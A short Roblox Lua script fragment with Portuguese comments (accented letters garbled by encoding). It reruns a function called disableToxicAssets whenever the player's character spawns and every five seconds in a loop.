-- Conecta o evento CharacterAdded para reaplicar as altera√ß√µes quando o personagem respawnar
player.CharacterAdded:Connect(function(character)
    -- Aguarda um pequeno tempo para garantir que o personagem e o ambiente estejam carregados
    wait(1)
    print("Personagem adicionado, reaplicando altera√ß√µes...")
    disableToxicAssets()
end)

-- Se o personagem j√° estiver presente, aplica as altera√ß√µes imediatamente
if player.Character then
    print("Personagem j√° presente, aplicando altera√ß√µes...")
    disableToxicAssets()
end

-- Adicione um loop para reaplicar as altera√ß√µes a cada 5 segundos
while true do
    disableToxicAssets()
    wait(5) -- Aguarda 5 segundos antes de reaplicar
end
